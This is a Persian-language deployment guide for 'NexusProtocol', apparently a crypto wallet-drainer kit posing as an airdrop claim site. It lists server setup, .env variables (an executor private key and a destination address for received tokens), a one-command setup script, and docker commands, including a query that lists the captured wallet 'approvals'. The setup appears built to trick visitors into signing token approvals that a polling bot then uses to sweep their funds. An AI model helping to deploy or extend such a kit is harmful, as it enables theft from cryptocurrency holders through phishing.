# راهنمای نصب NexusProtocol

## معماری
```
اینترنت → nginx (HTTPS/80/443) → /api/ → API Docker (8080)
                               → /airdrop/ → فایل‌های سایت
                  Docker Bot → هر ۱ثانیه API رو poll می‌کنه
```

---

## پیش‌نیازها
- سرور Ubuntu 20.04 / 22.04 (حداقل 1GB RAM)
- یک **دامنه** که DNS آن به IP سرور اشاره کرده باشه
  - مثلاً: `claim.mysite.com` → رکورد A → IP سرور

---

## مرحله ۱ — آپلود فایل‌ها

از کامپیوتر خودت:
```bash
scp nexus-deploy.zip root@IP_SERVER:/root/
```

روی سرور:
```bash
cd /root
apt install unzip -y
unzip nexus-deploy.zip
cd nexus-deploy
```

---

## مرحله ۲ — تنظیم .env

```bash
cp deploy/.env.example deploy/.env
nano deploy/.env
```

| متغیر | توضیح | مثال |
|-------|--------|-------|
| `DOMAIN` | دامنه‌ات (بدون https://) | `claim.mysite.com` |
| `DB_PASSWORD` | رمز دیتابیس (هر چیزی) | `Xk9@mP2#qR` |
| `SESSION_SECRET` | کلید امنیتی (هر رشته تصادفی) | `openssl rand -hex 32` |
| `EXECUTOR_PRIVATE_KEY` | کلید خصوصی کیف‌پول gas‌پرداز | بدون 0x |
| `DESTINATION_ADDRESS` | آدرس دریافت توکن | با 0x |
| `TELEGRAM_BOT_TOKEN` | از @BotFather | اختیاری |
| `TELEGRAM_CHAT_ID` | از @userinfobot | اختیاری |

---

## مرحله ۳ — اجرای خودکار همه چیز

```bash
chmod +x deploy/setup.sh
bash deploy/setup.sh
```

این اسکریپت به‌صورت خودکار:
1. ✅ Docker نصب می‌کنه (اگر نباشه)
2. ✅ سایت React رو build می‌کنه
3. ✅ API + ربات + دیتابیس رو با Docker اجرا می‌کنه
4. ✅ nginx رو روی سرور نصب و تنظیم می‌کنه
5. ✅ گواهی SSL رایگان (HTTPS) از Let's Encrypt می‌گیره
6. ✅ تجدید خودکار SSL هر ۳ماه

بعد از اتمام:
```
🌐 سایت:  https://claim.mysite.com/airdrop/
📡 API:   https://claim.mysite.com/api/approvals
🤖 ربات:  در حال اجرا
```

---

## دستورات مدیریت

```bash
# وضعیت سرویس‌ها
docker compose -f deploy/docker-compose.yml ps

# لاگ زنده ربات
docker compose -f deploy/docker-compose.yml logs -f bot

# لاگ API
docker compose -f deploy/docker-compose.yml logs -f api

# ری‌استارت ربات
docker compose -f deploy/docker-compose.yml restart bot

# خاموش کردن همه
docker compose -f deploy/docker-compose.yml down

# روشن کردن دوباره
docker compose -f deploy/docker-compose.yml up -d

# مشاهده approval‌های ذخیره‌شده
docker compose -f deploy/docker-compose.yml exec db \
  psql -U airdrop -c "SELECT wallet, wallet_type, status, created_at FROM approvals ORDER BY created_at DESC LIMIT 20;"
```

---

## اگر DNS هنوز منتقل نشده (تست با IP)
```bash
curl http://IP_SERVER/api/approvals/pending
# باید [] برگردونه
```
